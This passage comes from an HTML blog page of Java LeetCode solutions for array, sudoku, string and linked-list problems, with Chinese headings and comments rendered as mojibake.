map.get(target - nums[i])&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="36-æœ‰æ•ˆçš„æ•°ç‹¬-x2F-x2F"><a href="#36-æœ‰æ•ˆçš„æ•°ç‹¬-x2F-x2F" class="headerlink" title="36. æœ‰æ•ˆçš„æ•°ç‹¬&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/valid-sudoku/">36. æœ‰æ•ˆçš„æ•°ç‹¬</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç”¨ç©ºé—´æ¢æ—¶é—´, 3ä¸ª9*9booleançŸ©é˜µ,å…ˆéªŒè¯è¡Œ,å†éªŒè¯åˆ—,å†éªŒè¯å—,å‡ºç°çš„æ ‡è®°ä¸ºtrue;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidSudoku</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[][] row = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="type">boolean</span>[][] col = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="type">boolean</span>[][] block = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> board[i][j] - <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">blockIndex</span> <span class="operator">=</span> (i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">if</span> (row[i][t] || col[j][t] || block[blockIndex][t]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                row[i][t] = <span class="literal">true</span>;</span><br><span class="line">                col[j][t] = <span class="literal">true</span>;</span><br><span class="line">                block[blockIndex][t] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-50-ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦"><a href="#å‰‘æŒ‡-Offer-50-ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦" class="headerlink" title="å‰‘æŒ‡ Offer 50. ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦"></a><a href="https://leetcode-cn.com/problems/di-yi-ge-zhi-chu-xian-yi-ci-de-zi-fu-lcof/">å‰‘æŒ‡ Offer 50. ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å­—å…¸(99%)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">firstUniqChar</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : sc</span><br><span class="line">                ) &#123;</span><br><span class="line">            temp[c - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[c - <span class="string">&#x27;a&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å“ˆå¸Œè¡¨68%</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">firstUniqChar</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character, Boolean&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">                map.put(c, <span class="literal">false</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(c, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(c)) &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="41-ç¼ºå¤±çš„ç¬¬ä¸€ä¸ªæ­£æ•°"><a href="#41-ç¼ºå¤±çš„ç¬¬ä¸€ä¸ªæ­£æ•°" class="headerlink" title="41. ç¼ºå¤±çš„ç¬¬ä¸€ä¸ªæ­£æ•°"></a><a href="https://leetcode-cn.com/problems/first-missing-positive">41. ç¼ºå¤±çš„ç¬¬ä¸€ä¸ªæ­£æ•°</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hashset</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            set.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!set.contains(i)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸåœ°å“ˆå¸Œ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[i] &gt;= <span class="number">1</span> &amp;&amp; nums[i] != i+<span class="number">1</span> &amp;&amp; nums[i] - <span class="number">1</span> &lt; len &amp;&amp; nums[i] != nums[nums[i] - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[nums[i]-<span class="number">1</span>];</span><br><span class="line">                nums[nums[i]-<span class="number">1</span>] = nums[i];</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != i+<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸåœ°å“ˆå¸Œ(ä¼˜å…ˆä½¿ç”¨è¿™ä¸ª)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= <span class="number">0</span> || nums[i] &gt; n) &#123;</span><br><span class="line">                nums[i] = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == -<span class="number">1</span> || nums[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[(nums[i] - <span class="number">1</span>) % n] == -<span class="number">1</span>) &#123;</span><br><span class="line">                nums[(nums[i] - <span class="number">1</span>) % n] = nums[i]+ n;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nums[(nums[i] - <span class="number">1</span>) % n] += n;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nums[i] &lt;= n &amp;&amp; nums[i] &gt;= <span class="number">1</span> )|| nums[i] == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h2><h3 id="206-åè½¬é“¾è¡¨-x2F"><a href="#206-åè½¬é“¾è¡¨-x2F" class="headerlink" title="206. åè½¬é“¾è¡¨&#x2F;"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. åè½¬é“¾è¡¨</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¤´æ’æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> p .next;</span><br><span class="line">            p.next = dummy.next;</span><br><span class="line">            dummy.next = p;</span><br><span class="line">            p = q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é€’å½’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">    head.next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-ä¸¤æ•°ç›¸åŠ -x2F-x2F"><a href="#2-ä¸¤æ•°ç›¸åŠ -x2F-x2F" class="headerlink" title="2. ä¸¤æ•°ç›¸åŠ &#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/add-two-numbers/">2. ä¸¤æ•°ç›¸åŠ </a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> || l2 != <span class="literal">null</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> l1 == <span class="literal">null</span> ? <span class="number">0</span> : l1.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> l2 == <span class="literal">null</span> ? <span class="number">0</span> : l2.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> a + b + carry;</span><br><span class="line">            carry = sum / <span class="number">10</span>;</span><br><span class="line">            tail.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            <span class="keyword">if</span> (l1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tail.next = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="21-åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨-x2F-x2F-x2F"><a href="#21-åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨-x2F-x2F-x2F" class="headerlink" title="21. åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">21. åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€’å½’ O(m+n) O(m+n)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> mergeTwoLists(l1.next, l2);</span><br><span class="line">            l1.next = node;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> mergeTwoLists(l1, l2.next);</span><br><span class="line">            l2.next = node;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  è¿­ä»£</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="comment">// ç”¨å°¾æ’æ³•</span></span><br><span class="line">        <span class="comment">// å®šä¹‰ä¸€ä¸ªå‰ç½®èŠ‚ç‚¹</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> &amp;&amp; l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ¥l1çš„valå°äºç­‰äºl2çš„val</span></span><br><span class="line">            <span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">                tail.next = l1;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tail.next = l2;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æœ€ål1ä¸ä¸ºç©ºæœ€åç›´æ¥æ¥åœ¨tail</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªå°±æ˜¯è¿™ä¸ª</span></span><br><span class="line">        <span class="keyword">if</span> (l1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="148-æ’åºé“¾è¡¨-x2F"><a href="#148-æ’åºé“¾è¡¨-x2F" class="headerlink" title="148. æ’åºé“¾è¡¨&#x2F;"></a><a href="https://leetcode-cn.com/problems/sort-list/">148. æ’åºé“¾è¡¨</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å½’å¹¶æ’åº(é€’å½’æ³•)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sortList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> slow.next;</span><br><span class="line">        slow.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">rear</span> <span class="operator">=</span> prev;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">left</span> <span class="operator">=</span> sortList(head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">right</span> <span class="operator">=</span> sortList(temp);</span><br><span class="line">        <span class="keyword">while</span> (left != <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (left.val &lt;= right.val) &#123;</span><br><span class="line">                rear.next = left;</span><br><span class="line">                left = left.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                rear.next = right;</span><br><span class="line">                right = right.next;</span><br><span class="line">            &#125;</span><br><span class="line">            rear = rear.next;</span><br><span class="line">            rear.next = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (left != <span class="literal">null</span>) &#123;</span><br><span class="line">            rear.next = left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (right != <span class="literal">null</span>) &#123;</span><br><span class="line">            rear.next = right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="61-æ—‹è½¬é“¾è¡¨-x2F"><a href="#61-æ—‹è½¬é“¾è¡¨-x2F" class="headerlink" title="61. æ—‹è½¬é“¾è¡¨&#x2F;"></a><a href="https://leetcode-cn.com/problems/rotate-list/">61. æ—‹è½¬é“¾è¡¨</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŒæŒ‡é’ˆ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> ListNode <span class="title function_">rotateRight</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || k == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// è®¡ç®—é“¾è¡¨æœ‰å‡ ä¸ªèŠ‚ç‚¹å¹¶å°†qæŒ‡å‘é“¾è¡¨æœ«å°¾</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (q.next != <span class="literal">null</span>) &#123;</span><br><span class="line">      q = q.next;</span><br><span class="line">      len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¤„ç†kå¤§äºç­‰äºlençš„æƒ…å†µ</span></span><br><span class="line">    k = k % len;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å°†pæŒ‡å‘å€’æ•°ç¬¬k+1ä¸ªä½ç½®</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; (len - k)) &#123;</span><br><span class="line">      p = p.next;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> p.next;</span><br><span class="line">    q.next = head;</span><br><span class="line">    p.next = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="141-ç¯å½¢é“¾è¡¨-x2F-x2F-x2F"><a href="#141-ç¯å½¢é“¾è¡¨-x2F-x2F-x2F" class="headerlink" title="141. ç¯å½¢é“¾è¡¨&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. ç¯å½¢é“¾è¡¨</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¿«æ…¢æŒ‡é’ˆ: è¿™æ˜¯å› ä¸ºfastæ˜¯èµ°ä¸¤æ­¥ï¼Œslowæ˜¯èµ°ä¸€æ­¥ï¼Œå…¶å®ç›¸å¯¹äºslowæ¥è¯´ï¼Œfastæ˜¯ä¸€ä¸ªèŠ‚ç‚¹ä¸€ä¸ªèŠ‚ç‚¹çš„é è¿‘slowçš„ï¼Œæ‰€ä»¥fastä¸€å®šå¯ä»¥å’Œslowé‡åˆã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast.next != <span class="literal">null</span> &amp;&amp; fast.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

